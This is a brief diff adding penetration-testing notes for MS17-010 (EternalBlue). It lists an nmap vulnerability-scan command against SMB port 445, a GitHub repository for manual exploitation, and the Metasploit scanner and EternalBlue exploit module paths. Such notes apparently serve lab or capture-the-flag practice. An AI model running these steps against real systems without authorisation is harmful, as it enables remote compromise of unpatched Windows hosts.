@@ -1,0 +1,13 @@
+nmap -sV -p 445 --script=smb-vuln-ms17-010 <ip>
+
+MANUAL:
+github.com
+3ndG4me/ AutoBlue-MS17-010
+
+
+msfconsole -q
+
+auxiliary/scanner/smb/smb_ms17_010
+
+exploit/windows/smb/smb_ms17_010_eternalblue
+
